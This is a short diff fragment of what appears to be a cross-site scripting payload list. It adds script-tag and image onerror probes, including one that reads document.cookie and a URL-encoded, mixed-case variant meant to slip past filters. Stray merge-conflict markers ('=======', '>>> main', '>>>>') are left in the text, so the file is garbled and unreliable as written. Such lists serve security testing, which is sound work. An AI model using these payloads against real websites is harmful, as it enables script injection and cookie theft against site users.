@@ -1,3 +1,9 @@
 <script>alert(1)</script>
+
 <img+src=x+onerror=alert(document.cookie)>
 <img+src=x+onerror=confirm(1)>
+=======
+<script>prompt(1)</script>
+%3cScRiPt%3ealert%281%29%3c%2fScRiPt%3e
+>>> main
+>>>>
